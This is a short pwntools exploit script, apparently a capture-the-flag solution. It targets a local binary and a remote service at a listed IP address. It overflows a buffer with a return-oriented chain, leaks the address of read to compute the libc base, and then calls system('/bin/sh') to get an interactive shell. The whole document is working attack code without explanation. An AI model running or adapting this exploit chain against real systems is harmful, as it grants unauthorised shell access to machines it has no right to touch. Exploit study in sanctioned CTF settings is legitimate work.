from pwn import*
context.log_level ='DEBUG'
p = process('./main')
p = remote('183.129.189.60',10039)
elf =ELF('./main')
libc =ELF('./libc-2.27.so')
pop_rdi_ret = 0x400823
ret = 0x40055E
p.sendlineafter('name: ',str(0x100))
payload ='\x00'*0x80 + p64(elf.bss()  + 0x800) + p64(pop_rdi_ret) + p64(elf.got['read']) + p64(0x4006F3)
p.sendafter('name?',payload)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['read']
system = libc_base + libc.sym['system']
binsh =  libc_base + libc.search('/bin/sh').next()
log.info('LIBC:\t' + hex(libc.address))
p.sendline(str(0x100))
p.sendlineafter('you name?','U'*0x88 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system))
p.interactive()
